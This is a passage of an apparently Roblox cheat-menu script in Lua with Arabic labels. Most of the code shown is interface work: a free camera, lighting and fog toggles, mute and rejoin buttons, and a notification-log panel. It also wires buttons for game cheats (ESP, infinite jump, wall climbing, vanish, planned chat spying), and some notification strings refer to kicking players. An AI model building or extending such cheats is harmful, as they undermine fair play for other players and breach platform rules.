                    cam.CameraSubject = saved.hum
                end)
            end
        end
        saved = nil
        fcBtn.Text = T18T("فري كام")
        fcBtn.BackgroundColor3 = Theme.ButtonBlue
        showNotification(T18T("تم ايقاف الفري كام"))
    end

    local function buildControls()
        local pg = LocalPlayer:FindFirstChild("PlayerGui")
        if not pg then return end
        ctrlGui = Instance.new("ScreenGui")
        ctrlGui.Name = "T18FreeCamCtl"
        ctrlGui.ResetOnSpawn = false
        ctrlGui.DisplayOrder = 99990
        ctrlGui.IgnoreGuiInset = true
        ctrlGui.Parent = pg

        local function mk(text, yOff, onDown, onUp)
            local b = Instance.new("TextButton")
            b.AnchorPoint = Vector2.new(1, 0.5)
            b.Size = UDim2.new(0, 46, 0, 46)
            b.Position = UDim2.new(1, -14, 0.5, yOff)
            b.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
            b.Text = text
            b.TextColor3 = Color3.fromRGB(255, 255, 255)
            b.Font = Enum.Font.GothamBold
            b.TextSize = 18
            b.AutoButtonColor = false
            b.Parent = ctrlGui
            makeCorner(b, 12)
            makeStroke(b, Theme.Border, 1, 0.1)
            if onDown then b.MouseButton1Down:Connect(onDown) end
            if onUp then
                b.MouseButton1Up:Connect(onUp)
                b.MouseLeave:Connect(onUp)
            end
            return b
        end
        mk("▲", -80, function() upHeld = true end, function() upHeld = false end)
        mk("▼", -28, function() downHeld = true end, function() downHeld = false end)
        mk("⚡+", 24, function() speed = math.min(speed * 1.5, 600) end)
        mk("⚡−", 76, function() speed = math.max(speed / 1.5, 8) end)
    end

    local function start()
        local cam = workspace.CurrentCamera
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not cam or not hum then
            showNotification(T18T("تعذّر تشغيل الفري كام"))
            return
        end
        saved = { hum = hum, ws = hum.WalkSpeed, jp = hum.JumpPower, jh = hum.JumpHeight }
        camPos = cam.CFrame.Position
        local rx, ry = cam.CFrame:ToOrientation()
        pitch, yaw = rx, ry
        hum.WalkSpeed = 0
        hum.JumpPower = 0
        hum.JumpHeight = 0
        cam.CameraType = Enum.CameraType.Scriptable
        active = true
        buildControls()

        table.insert(conns, RunService.RenderStepped:Connect(function(dt)
            local c = workspace.CurrentCamera
            if not c or not saved then return end
            c.CameraType = Enum.CameraType.Scriptable
            local rot = CFrame.fromEulerAnglesYXZ(pitch, yaw, 0)
            local look = rot.LookVector
            local move = Vector3.zero
            local md = saved.hum.MoveDirection
            local flat = Vector3.new(look.X, 0, look.Z)
            if md.Magnitude > 0.01 and flat.Magnitude > 0.01 then
                flat = flat.Unit
                local flatRight = Vector3.new(-flat.Z, 0, flat.X)
                move = look * md:Dot(flat) + rot.RightVector * md:Dot(flatRight)
            end
            local v = 0
            if not UserInputService:GetFocusedTextBox() then
                if UserInputService:IsKeyDown(Enum.KeyCode.E) then v += 1 end
                if UserInputService:IsKeyDown(Enum.KeyCode.Q) then v -= 1 end
            end
            if upHeld then v += 1 end
            if downHeld then v -= 1 end
            move += Vector3.new(0, v, 0)
            local mult = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) and 3 or 1
            camPos += move * speed * mult * dt
            c.CFrame = CFrame.new(camPos) * rot
        end))

        table.insert(conns, UserInputService.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton2 then
                rmbDown = true
                UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
            end
        end))
        table.insert(conns, UserInputService.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton2 then
                rmbDown = false
                UserInputService.MouseBehavior = Enum.MouseBehavior.Default
            end
        end))
        table.insert(conns, UserInputService.InputChanged:Connect(function(input, processed)
            local k = nil
            if input.UserInputType == Enum.UserInputType.MouseMovement and rmbDown then
                k = 0.004
            elseif input.UserInputType == Enum.UserInputType.Touch and not processed then
                k = 0.006
            end
            if k then
                yaw = yaw - input.Delta.X * k
                pitch = math.clamp(pitch - input.Delta.Y * k, -1.5, 1.5)
            end
        end))
        table.insert(conns, LocalPlayer.CharacterRemoving:Connect(function()
            stop()
        end))

        fcBtn.Text = T18T("ايقاف فري كام")
        fcBtn.BackgroundColor3 = Theme.Active
        showNotification(T18T("تم تشغيل الفري كام"))
    end

    fcBtn.MouseButton1Click:Connect(function()
        if active then stop() else start() end
    end)
end
do local b = makeButton("LowGravBtn", "جاذبية منخفضة", UDim2.new(0.5, -14, 0, 38), UDim2.new(0, 10, 0, 152), Theme.ButtonBlue, Theme.Accent); b.Parent = OthersPage end
do local b = makeButton("InfiniteJumpBtn", "قفز لا نهائي", UDim2.new(0.5, -14, 0, 38), UDim2.new(0, 10, 0, 214), Theme.ButtonBlue, Theme.Accent); b.Parent = PlayerPage end
do local b = makeButton("WallClimbBtn", "تسلق الجدران", UDim2.new(0.5, -14, 0, 38), UDim2.new(0.5, 4, 0, 214), Theme.ButtonBlue, Theme.Accent); b.Parent = PlayerPage end
do local b = makeButton("VanishBtn", T18T("اختفاء"), UDim2.new(0.5, -14, 0, 38), UDim2.new(0.5, 4, 0, 258), Theme.ButtonBlue, Theme.Accent); b.Parent = PlayerPage end
do local b = makeButton("ESPBtn", "ESP", UDim2.new(0.5, -14, 0, 38), UDim2.new(0.5, 4, 0, 152), Theme.ButtonBlue, Theme.Accent); b.Parent = OthersPage end
do local b = makeButton("FPSPingBtn", "FPS / Ping", UDim2.new(0.5, -14, 0, 38), UDim2.new(0.5, 4, 0, 192), Theme.ButtonBlue, Theme.Accent); b.Parent = OthersPage end
do local b = makeButton("SessionTimeBtn", "وقتك بالسيرفر", UDim2.new(0.5, -14, 0, 38), UDim2.new(0, 10, 0, 192), Theme.ButtonBlue, Theme.Accent); b.Parent = OthersPage
    b.ClipsDescendants = true
    b.TextTransparency = 1; b.TextStrokeTransparency = 1
    b:GetPropertyChangedSignal("TextTransparency"):Connect(function() if b.TextTransparency ~= 1 then b.TextTransparency = 1 end end)
    local ov = b:FindFirstChild("ButtonTextOverlay")
    if ov then
        ov.TextWrapped = false; ov.TextScaled = true
        ov.TextXAlignment = Enum.TextXAlignment.Center; ov.TextYAlignment = Enum.TextYAlignment.Center
        ov.Size = UDim2.new(1, -16, 1, -12); ov.Position = UDim2.new(0, 8, 0, 6)
        local c = Instance.new("UITextSizeConstraint"); c.MaxTextSize = 17; c.MinTextSize = 10; c.Parent = ov
    end
end
do local b = makeButton("ServerInfoBtn", "معلومات السيرفر", UDim2.new(0.5, -14, 0, 38), UDim2.new(0, 10, 0, 232), Theme.ButtonBlue, Theme.Accent); b.Parent = OthersPage end

do local b = makeButton("RejoinBtn", "رجوين", UDim2.new(0.5,-14,0,38), UDim2.new(0.5,4,0,232), Theme.ButtonBlue, Theme.Accent); b.Parent = OthersPage
   b.MouseButton1Click:Connect(function()
       pcall(function() game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer) end)
   end)
end

do local b = makeButton("SwitchSrvBtn", "تغيير السيرفر", UDim2.new(0.5,-14,0,38), UDim2.new(0,10,0,272), Theme.ButtonBlue, Theme.Accent); b.Parent = OthersPage
   b.MouseButton1Click:Connect(function()
       pcall(function() game:GetService("TeleportService"):Teleport(game.PlaceId) end)
   end)
end

do
    local _muted = false
    local b = makeButton("MuteGameBtn", "كتم الصوت", UDim2.new(0.5,-14,0,38), UDim2.new(0.5,4,0,272), Theme.ButtonBlue, Theme.Accent)
    b.Parent = OthersPage
    b.MouseButton1Click:Connect(function()
        _muted = not _muted
        pcall(function()
            for _, s in ipairs(workspace:GetDescendants()) do
                if s:IsA("Sound") then s.Volume = _muted and 0 or 1 end
            end
        end)
        b.Text = _muted and "تفعيل الصوت" or "كتم الصوت"
        b.BackgroundColor3 = _muted and Theme.Active or Theme.ButtonBlue
    end)
end

do
    local _on = false
    local b = makeButton("FullBrightBtn", "فول برايت", UDim2.new(0.5,-14,0,38), UDim2.new(0,10,0,312), Theme.ButtonBlue, Theme.Accent)
    b.Parent = OthersPage
    b.MouseButton1Click:Connect(function()
        _on = not _on
        pcall(function()
            local L = game:GetService("Lighting")
            if _on then
                L.Brightness=2; L.ClockTime=14; L.GlobalShadows=false
                L.Ambient=Color3.new(1,1,1); L.FogEnd=100000
            else
                L.Brightness=1; L.ClockTime=14; L.GlobalShadows=true
                L.Ambient=Color3.new(0.5,0.5,0.5)
            end
        end)
        b.Text = _on and "ايقاف برايت" or "فول برايت"
        b.BackgroundColor3 = _on and Color3.fromRGB(245,158,11) or Theme.ButtonBlue
    end)
end

do
    local _on = false
    local b = makeButton("NoFogBtn", "ازالة الضباب", UDim2.new(0.5,-14,0,38), UDim2.new(0.5,4,0,312), Theme.ButtonBlue, Theme.Accent)
    b.Parent = OthersPage
    b.MouseButton1Click:Connect(function()
        _on = not _on
        pcall(function()
            local L = game:GetService("Lighting")
            L.FogEnd   = _on and 100000 or 1000
            L.FogStart = _on and 99999  or 0
        end)
        b.Text = _on and "تفعيل الضباب" or "ازالة الضباب"
        b.BackgroundColor3 = _on and Color3.fromRGB(245,158,11) or Theme.ButtonBlue
    end)
end

do
    local _on = false; local _conn = nil; local _cf = nil
    local b = makeButton("CamLockBtn", "تجميد الكاميرا", UDim2.new(0.5,-14,0,38), UDim2.new(0.5,4,0,352), Theme.ButtonBlue, Theme.Accent)
    b.Parent = OthersPage
    b.MouseButton1Click:Connect(function()
        _on = not _on
        local cam = workspace.CurrentCamera
        if _on then
            _cf = cam.CFrame; cam.CameraType = Enum.CameraType.Scriptable
            _conn = RunService.RenderStepped:Connect(function()
                workspace.CurrentCamera.CFrame = _cf
            end)
        else
            if _conn then _conn:Disconnect(); _conn = nil end
            pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
        end
        b.Text = _on and "الغاء التجميد" or "تجميد الكاميرا"
        b.BackgroundColor3 = _on and Theme.Active or Theme.ButtonBlue
    end)
end

do
    local _nightOn = false
    local _nightSavedClock = 14
    local b = makeButton("NightBtn", "وضع الليل", UDim2.new(0.5,-14,0,38), UDim2.new(0,10,0,352), Theme.ButtonBlue, Theme.Accent)
    b.Parent = OthersPage
    b.MouseButton1Click:Connect(function()
        _nightOn = not _nightOn
        pcall(function()
            local L = game:GetService("Lighting")
            if _nightOn then
                _nightSavedClock = L.ClockTime
                L.ClockTime  = 0
                L.Brightness = 0.8
            else
                L.ClockTime  = _nightSavedClock > 0 and _nightSavedClock or 14
                L.Brightness = 1
            end
        end)
        b.Text = _nightOn and "الغاء الليل" or "وضع الليل"
        b.BackgroundColor3 = _nightOn and Color3.fromRGB(99,102,241) or Theme.ButtonBlue
    end)
end

local function markComingSoon(button)

    button.Interactable = false
    button.TextColor3 = Color3.fromRGB(70, 70, 80)
    button.BackgroundTransparency = 0.55

    local soonLabel = Instance.new("TextLabel", button)
    soonLabel.Size = UDim2.new(0, 52, 0, 20)
    soonLabel.Position = UDim2.new(0, 8, 0.5, -10)
    soonLabel.BackgroundColor3 = Color3.fromRGB(180, 100, 0)
    soonLabel.BackgroundTransparency = 0
    soonLabel.Text = "قريباً"
    soonLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    soonLabel.Font = Enum.Font.GothamBold
    soonLabel.TextSize = 11
    soonLabel.BorderSizePixel = 0
    soonLabel.ZIndex = 200
    makeCorner(soonLabel, 6)
end

do
    local b = makeButton("HdAdminBtn", "الادمن", UDim2.new(0.5,-14,0,38), UDim2.new(0,10,0,392), Theme.ButtonBlue, Theme.Accent)
    b.Parent = OthersPage
    markComingSoon(b)
end
do
    local b = makeButton("AntiCopyStopBtn", "مضاد ايقاف نسخ", UDim2.new(0.5,-14,0,38), UDim2.new(0.5,4,0,392), Theme.ButtonBlue, Theme.Accent)
    b.Parent = OthersPage
    markComingSoon(b)
end
do
    local b = makeButton("ChatSpyBtn", "سباي الشات", UDim2.new(0.5,-14,0,38), UDim2.new(0,10,0,432), Theme.ButtonBlue, Theme.Accent)
    b.Parent = OthersPage
    markComingSoon(b)
end

;(function()
    local logBtn = makeButton("NotifLogBtn", "سجل الاشعارات", UDim2.new(0.5,-14,0,38), UDim2.new(0.5,4,0,432), Theme.ButtonBlue, Theme.Accent)
    logBtn.Parent = OthersPage

    -- ===== R7L Notification Center (Pro) =====
    local CSK = ColorSequenceKeypoint.new
    local NL_GREEN = Color3.fromRGB(122, 214, 158)
    local NL_AMBER = Color3.fromRGB(232, 196, 120)
    local NL_RED   = Color3.fromRGB(232, 122, 122)
    local NL_BLUE  = Color3.fromRGB(146, 172, 232)

    local KINDS = {
        all  = { label = "الكل",   color = Theme.Accent },
        ok   = { label = "نجاح",   color = NL_GREEN, glyph = "✓" },
        warn = { label = "تنبيه",  color = NL_AMBER, glyph = "!" },
        err  = { label = "خطأ",    color = NL_RED,   glyph = "✕" },
        info = { label = "معلومة", color = NL_BLUE,  glyph = "i" },
    }
    local KIND_ORDER = { "all", "ok", "warn", "err", "info" }

    local function hasAny(m, list)
        for _, k in ipairs(list) do
            if string.find(m, k, 1, true) then return true end
        end
        return false
    end
    local function classify(m)
        m = tostring(m or "")
        if hasAny(m, { "فشل", "ما اقدر", "ما تقدر", "غير موجود", "مانع", "خطأ", "تعذر", "error", "Error", "failed", "Failed" }) then return "err" end
        if hasAny(m, { "جاري", "انتظر", "تحذير", "تنبيه", "نسخ عليك" }) then return "warn" end
        if hasAny(m, { "تم ", "تم\n", "شغّال", "شغال", "تفعيل", "مفعّل", "انطرد", "نسخت", "حذفت" }) then return "ok" end
        return "info"
    end

    local function isEn() return _T18Lang == "en" end
    local function ago(ts)
        local d = math.max(0, math.floor(tick() - (ts or tick())))
        if isEn() then
            if d < 10 then return "now" end
            if d < 60 then return d .. "s ago" end
            if d < 3600 then return math.floor(d / 60) .. "m ago" end
            return math.floor(d / 3600) .. "h ago"
        end
        if d < 10 then return "الآن" end
        if d < 60 then return "قبل " .. d .. " ث" end
        if d < 3600 then return "قبل " .. math.floor(d / 60) .. " د" end
        return "قبل " .. math.floor(d / 3600) .. " س"
    end
    local function clock(e)
        local t = e.t or (os.time() - math.floor(tick() - (e.ts or tick())))
        local ok, s = pcall(function() return os.date("%I:%M %p", t) end)
        if not ok or type(s) ~= "string" then return "--:--" end
        if not isEn() then s = s:gsub("AM", "ص"):gsub("PM", "م") end
        return s
    end
    local function metaText(e)
        return clock(e) .. "  ·  " .. ago(e.ts)
    end
    local function tr(s)
        if type(T18TranslateText) == "function" then
            local ok, r = pcall(T18TranslateText, s, _T18Lang)
            if ok and type(r) == "string" then return r end
        end
        return s
    end

    -- ---------- page ----------
    local page = Instance.new("Frame")
    page.Name = "NotifLogPage"
    page.Size = UDim2.fromScale(1, 1)
    page.BackgroundColor3 = Theme.Card
    page.BorderSizePixel = 0
    page.ZIndex = 10
    page.Active = true
    page.Visible = false
    page.ClipsDescendants = true
    page.Parent = OthersPage
    makeCorner(page, 14)
    makeStroke(page, Theme.Border, 1, 0.05)
    UiFx.makeGradient(page, { CSK(0, Color3.fromRGB(15, 15, 15)), CSK(1, Color3.fromRGB(4, 4, 4)) }, 90)
    pcall(function() UiFx.makeStarField(page, 14) end)
    -- full-size input sink so nothing behind the log can be clicked
    local blocker = Instance.new("TextButton")
    blocker.Name = "InputSink"
    blocker.Size = UDim2.fromScale(1, 1)
    blocker.BackgroundTransparency = 1
    blocker.Text = ""
    blocker.AutoButtonColor = false
    blocker.Selectable = false
    blocker.ZIndex = 10
    blocker.Parent = page

    local pageScale = Instance.new("UIScale")
    pageScale.Scale = 1
    pageScale.Parent = page

    local shine = Instance.new("Frame")
    shine.Size = UDim2.new(1, -28, 0, 1)
    shine.Position = UDim2.new(0, 14, 0, 0)
    shine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    shine.BackgroundTransparency = 0.8
    shine.BorderSizePixel = 0
    shine.ZIndex = 12
    shine.Parent = page

    -- header icon tile (right side, RTL)
    local iconTile = Instance.new("Frame")
    iconTile.Size = UDim2.new(0, 36, 0, 36)
    iconTile.Position = UDim2.new(1, -48, 0, 10)
    iconTile.BackgroundColor3 = Theme.ButtonDefault
    iconTile.BorderSizePixel = 0
    iconTile.ZIndex = 12
    iconTile.Parent = page
    makeCorner(iconTile, 10)
    makeStroke(iconTile, Theme.Border, 1, 0.05)
    UiFx.makeGradient(iconTile, { CSK(0, Color3.fromRGB(34, 34, 34)), CSK(1, Color3.fromRGB(14, 14, 14)) }, 90)
    local bell = Instance.new("TextLabel")
    bell.Size = UDim2.fromScale(1, 1)
    bell.BackgroundTransparency = 1
    bell.Text = "🔔"
    bell.TextSize = 16
    bell.Font = Enum.Font.GothamBold
    bell.TextColor3 = Theme.Text
    bell.ZIndex = 13
    bell.Parent = iconTile
    local liveDot = Instance.new("Frame")
    liveDot.Size = UDim2.new(0, 8, 0, 8)
    liveDot.AnchorPoint = Vector2.new(0.5, 0.5)
    liveDot.Position = UDim2.new(0, 4, 0, 4)
    liveDot.BackgroundColor3 = NL_GREEN
    liveDot.BorderSizePixel = 0
    liveDot.ZIndex = 14
    liveDot.Parent = iconTile
    makeCorner(liveDot, 4)
    makeStroke(liveDot, Theme.Card, 2, 0)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -230, 0, 20)
    title.Position = UDim2.new(0, 170, 0, 10)
    title.BackgroundTransparency = 1
    title.Text = "سجل الاشعارات"
    title.TextColor3 = Theme.Text
    title.TextXAlignment = Enum.TextXAlignment.Right
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 16
    title.ZIndex = 12
    title.Parent = page

    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(1, -230, 0, 14)
    subtitle.Position = UDim2.new(0, 170, 0, 31)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = ""
    subtitle.TextColor3 = Theme.Muted
    subtitle.TextXAlignment = Enum.TextXAlignment.Right
    subtitle.Font = Enum.Font.GothamMedium
    subtitle.TextSize = 11
    subtitle.TextTruncate = Enum.TextTruncate.AtEnd
    subtitle.ZIndex = 12
    subtitle.Parent = page

    -- gray header buttons (same family as the other close buttons)
    local function headerBtn(text, w, x)
        local b = Instance.new("TextButton")
        b.Size = UDim2.new(0, w, 0, 28)
        b.Position = UDim2.new(0, x, 0, 14)
        b.BackgroundColor3 = Theme.ButtonDefault
        b.AutoButtonColor = false
        b.Text = text
        b.TextColor3 = Theme.Muted
        b.Font = Enum.Font.GothamBold
        b.TextSize = 12
        b.ZIndex = 13
        b.Parent = page
        makeCorner(b, 8)
        local st = makeStroke(b, Theme.Border, 1, 0.1)
        b.MouseEnter:Connect(function()
            TweenService:Create(b, TweenInfo.new(0.12), { BackgroundColor3 = Theme.ButtonDefaultAlt, TextColor3 = Theme.Text }):Play()
            TweenService:Create(st, TweenInfo.new(0.12), { Color = Color3.fromRGB(80, 80, 80) }):Play()
        end)
        b.MouseLeave:Connect(function()
            if b:GetAttribute("Armed") then return end
            TweenService:Create(b, TweenInfo.new(0.12), { BackgroundColor3 = Theme.ButtonDefault, TextColor3 = Theme.Muted }):Play()
            TweenService:Create(st, TweenInfo.new(0.12), { Color = Theme.Border }):Play()
        end)
        return b, st
    end
    local closeBtn = headerBtn("✕", 28, 12)
    closeBtn.TextSize = 13
    local clearBtn, clearStroke = headerBtn(T18T("مسح الكل"), 74, 46)

    local divider = Instance.new("Frame")
    divider.Size = UDim2.new(1, -24, 0, 1)
    divider.Position = UDim2.new(0, 12, 0, 56)
    divider.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    divider.BorderSizePixel = 0
    divider.ZIndex = 12
    divider.Parent = page
    do
        local g = Instance.new("UIGradient")
        g.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.5, 0.2),
            NumberSequenceKeypoint.new(1, 1),
        })
        g.Parent = divider
    end

    -- ---------- filter chips ----------
    local chipsRow = Instance.new("Frame")
    chipsRow.Size = UDim2.new(1, -24, 0, 26)
    chipsRow.Position = UDim2.new(0, 12, 0, 66)
    chipsRow.BackgroundTransparency = 1
    chipsRow.ZIndex = 12
    chipsRow.Parent = page
    local chipsLayout = Instance.new("UIListLayout")
    chipsLayout.FillDirection = Enum.FillDirection.Horizontal
    chipsLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
    chipsLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    chipsLayout.SortOrder = Enum.SortOrder.LayoutOrder
    chipsLayout.Padding = UDim.new(0, 6)
    chipsLayout.Parent = chipsRow

    local activeFilter = "all"
    local chips = {}
    local render -- forward

    local function hex(c)
        return string.format("#%02X%02X%02X", math.floor(c.R * 255), math.floor(c.G * 255), math.floor(c.B * 255))
    end
    local function paintChips(counts)
        for key, ch in pairs(chips) do
            local K = KINDS[key]
            local on = key == activeFilter
            local n = counts and counts[key] or 0
            ch.btn.Text = T18T(K.label) .. '  <font face="Code" color="' .. (on and "#FFFFFF" or "#7A7A7A") .. '">' .. n .. '</font>'
            TweenService:Create(ch.btn, TweenInfo.new(0.15), {
                BackgroundColor3 = on and Theme.ButtonDefaultAlt or Theme.ButtonDefault,
                TextColor3 = on and Theme.Text or Theme.Muted,
            }):Play()
            TweenService:Create(ch.stroke, TweenInfo.new(0.15), {
                Color = on and K.color or Theme.Border,
                Transparency = on and 0.35 or 0.1,
            }):Play()
            if ch.dot then ch.dot.BackgroundTransparency = on and 0 or 0.45 end
        end
    end

    for i, key in ipairs(KIND_ORDER) do
        local K = KINDS[key]
        local b = Instance.new("TextButton")
        b.Size = UDim2.new(0, 0, 0, 24)
        b.AutomaticSize = Enum.AutomaticSize.X
        b.BackgroundColor3 = Theme.ButtonDefault
        b.AutoButtonColor = false
        b.RichText = true
        b.Text = T18T(K.label)
        b.TextColor3 = Theme.Muted
        b.Font = Enum.Font.GothamBold
        b.TextSize = 11
        b.ZIndex = 13
        b.LayoutOrder = #KIND_ORDER - i -- RTL: "all" sits on the far right
        b.Parent = chipsRow
        makeCorner(b, 12)
        local st = makeStroke(b, Theme.Border, 1, 0.1)
        local pad = Instance.new("UIPadding")
        pad.PaddingLeft = UDim.new(0, 10)
        pad.PaddingRight = UDim.new(0, key == "all" and 10 or 20)
        pad.Parent = b
        local dot
        if key ~= "all" then
            dot = Instance.new("Frame")
            dot.Size = UDim2.new(0, 6, 0, 6)
            dot.AnchorPoint = Vector2.new(0, 0.5)
            dot.Position = UDim2.new(1, 8, 0.5, 0)
            dot.BackgroundColor3 = K.color
            dot.BackgroundTransparency = 0.45
            dot.BorderSizePixel = 0
            dot.ZIndex = 14
            dot.Parent = b
            makeCorner(dot, 3)
        end
        chips[key] = { btn = b, stroke = st, dot = dot }
        b.MouseButton1Click:Connect(function()
            if activeFilter == key then return end
            activeFilter = key
            render("all")
        end)
    end

    -- ---------- list ----------
    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -16, 1, -108)
    scroll.Position = UDim2.new(0, 8, 0, 100)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = isTouchDevice and 3 or 4
    scroll.ScrollBarImageColor3 = Color3.fromRGB(70, 70, 70)
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scroll.ScrollingDirection = Enum.ScrollingDirection.Y
    scroll.ZIndex = 11
    scroll.Parent = page
    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 6)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = scroll
    local scrollPad = Instance.new("UIPadding")
    scrollPad.PaddingTop = UDim.new(0, 2)
    scrollPad.PaddingBottom = UDim.new(0, 10)
    scrollPad.PaddingLeft = UDim.new(0, 4)
    scrollPad.PaddingRight = UDim.new(0, 8)
    scrollPad.Parent = scroll

    -- empty state
    local empty = Instance.new("Frame")
    empty.Size = UDim2.new(1, -40, 0, 110)
    empty.AnchorPoint = Vector2.new(0.5, 0.5)
    empty.Position = UDim2.new(0.5, 0, 0.5, 40)
    empty.BackgroundTransparency = 1
    empty.Visible = false
    empty.ZIndex = 12
    empty.Parent = page
    local emptyTile = Instance.new("Frame")
    emptyTile.Size = UDim2.new(0, 54, 0, 54)
    emptyTile.AnchorPoint = Vector2.new(0.5, 0)
    emptyTile.Position = UDim2.new(0.5, 0, 0, 0)
    emptyTile.BackgroundColor3 = Theme.ButtonDefault
    emptyTile.BorderSizePixel = 0
    emptyTile.ZIndex = 12
    emptyTile.Parent = empty
    makeCorner(emptyTile, 16)
    makeStroke(emptyTile, Theme.Border, 1, 0.05)
    UiFx.makeGradient(emptyTile, { CSK(0, Color3.fromRGB(30, 30, 30)), CSK(1, Color3.fromRGB(12, 12, 12)) }, 90)
    -- minimal drawn "empty list" glyph
    for li, w in ipairs({ 22, 16, 10 }) do
        local bar = Instance.new("Frame")
        bar.Size = UDim2.new(0, w, 0, 3)
        bar.AnchorPoint = Vector2.new(1, 0)
        bar.Position = UDim2.new(0.5, 11, 0, 18 + (li - 1) * 7)
        bar.BackgroundColor3 = Theme.Muted
        bar.BackgroundTransparency = 0.35 + (li - 1) * 0.2
        bar.BorderSizePixel = 0
        bar.ZIndex = 13
        bar.Parent = emptyTile
        makeCorner(bar, 2)
    end
    local emptyTitle = Instance.new("TextLabel")
    emptyTitle.Size = UDim2.new(1, 0, 0, 20)
    emptyTitle.Position = UDim2.new(0, 0, 0, 64)
    emptyTitle.BackgroundTransparency = 1
    emptyTitle.Text = ""
    emptyTitle.TextColor3 = Theme.Text
    emptyTitle.Font = Enum.Font.GothamBold
    emptyTitle.TextSize = 14
    emptyTitle.ZIndex = 12
    emptyTitle.Parent = empty
    local emptySub = Instance.new("TextLabel")
    emptySub.Size = UDim2.new(1, 0, 0, 16)
    emptySub.Position = UDim2.new(0, 0, 0, 86)
    emptySub.BackgroundTransparency = 1
    emptySub.Text = ""
    emptySub.TextColor3 = Theme.Muted
    emptySub.Font = Enum.Font.Gotham
    emptySub.TextSize = 11
    emptySub.ZIndex = 12
    emptySub.Parent = empty

    local timeRefs = setmetatable({}, { __mode = "k" })

    local function makeCard(e, order, animate, delayIdx)
        local kind = e.k or classify(e.m)
        e.k = kind
        local K = KINDS[kind]

        local card = Instance.new("Frame")
        card.Name = "NotifCard"
        card.Size = UDim2.new(1, 0, 0, 0)
        card.AutomaticSize = Enum.AutomaticSize.Y
        card.BackgroundColor3 = Theme.PanelSoft
        card.BorderSizePixel = 0
        card.LayoutOrder = order
        card.ZIndex = 12
        card.Parent = scroll
        makeCorner(card, 10)
        local stroke = makeStroke(card, Theme.Border, 1, 0.3)
        UiFx.makeGradient(card, { CSK(0, Color3.fromRGB(10, 10, 10)), CSK(1, Color3.fromRGB(24, 24, 24)) }, 0)
        local pad = Instance.new("UIPadding")
        pad.PaddingTop = UDim.new(0, 9)
        pad.PaddingBottom = UDim.new(0, 10)
        pad.PaddingLeft = UDim.new(0, 12)
        pad.PaddingRight = UDim.new(0, 52)
        pad.Parent = card

        -- icon tile (sits inside the right padding)
        local tile = Instance.new("Frame")
        tile.Size = UDim2.new(0, 30, 0, 30)
        tile.Position = UDim2.new(1, 12, 0, 1)
        tile.BackgroundColor3 = K.color
        tile.BackgroundTransparency = 0.86
        tile.BorderSizePixel = 0
        tile.ZIndex = 13
        tile.Parent = card
        makeCorner(tile, 9)
        local tileStroke = makeStroke(tile, K.color, 1, 0.55)
        local glyph = Instance.new("TextLabel")
        glyph.Size = UDim2.fromScale(1, 1)
        glyph.BackgroundTransparency = 1
        glyph.Text = K.glyph or "•"
        glyph.TextColor3 = K.color
        glyph.Font = Enum.Font.GothamBlack
        glyph.TextSize = 14
        glyph.ZIndex = 14
        glyph.Parent = tile

        -- meta row: kind (right) + time (left)
        local kindLbl = Instance.new("TextLabel")
        kindLbl.Size = UDim2.new(0.5, 0, 0, 13)
        kindLbl.Position = UDim2.new(0.5, 0, 0, 0)
        kindLbl.BackgroundTransparency = 1
        kindLbl.Text = T18T(K.label)
        kindLbl.TextColor3 = K.color
        kindLbl.TextXAlignment = Enum.TextXAlignment.Right
        kindLbl.Font = Enum.Font.GothamBold
        kindLbl.TextSize = 10
        kindLbl.ZIndex = 13
        kindLbl.Parent = card

        local timeLbl = Instance.new("TextLabel")
        timeLbl.Size = UDim2.new(0.5, 0, 0, 13)
        timeLbl.Position = UDim2.new(0, 0, 0, 0)
        timeLbl.BackgroundTransparency = 1
        timeLbl.Text = metaText(e)
        timeLbl.TextColor3 = Color3.fromRGB(120, 120, 120)
        timeLbl.TextXAlignment = Enum.TextXAlignment.Left
        timeLbl.Font = Enum.Font.Code
        timeLbl.TextSize = 10
        timeLbl.ZIndex = 13
        timeLbl.Parent = card
        timeRefs[timeLbl] = e

        local msg = Instance.new("TextLabel")
        msg.Size = UDim2.new(1, 0, 0, 0)
        msg.Position = UDim2.new(0, 0, 0, 18)
        msg.AutomaticSize = Enum.AutomaticSize.Y
        msg.BackgroundTransparency = 1
        msg.Text = tr(e.m)
        msg.TextColor3 = Theme.Text
        msg.TextXAlignment = Enum.TextXAlignment.Right
        msg.TextYAlignment = Enum.TextYAlignment.Top
        msg.TextWrapped = true
        msg.LineHeight = 1.12
        msg.Font = Enum.Font.GothamMedium
        msg.TextSize = 13
        msg.ZIndex = 13
        msg.Parent = card

        card.MouseEnter:Connect(function()
            TweenService:Create(stroke, TweenInfo.new(0.15), { Color = Color3.fromRGB(85, 85, 85), Transparency = 0 }):Play()
            TweenService:Create(tile, TweenInfo.new(0.15), { BackgroundTransparency = 0.75 }):Play()
        end)
        card.MouseLeave:Connect(function()
            TweenService:Create(stroke, TweenInfo.new(0.15), { Color = Theme.Border, Transparency = 0.3 }):Play()
            TweenService:Create(tile, TweenInfo.new(0.15), { BackgroundTransparency = 0.86 }):Play()
        end)

        if animate then
            local sc = Instance.new("UIScale")
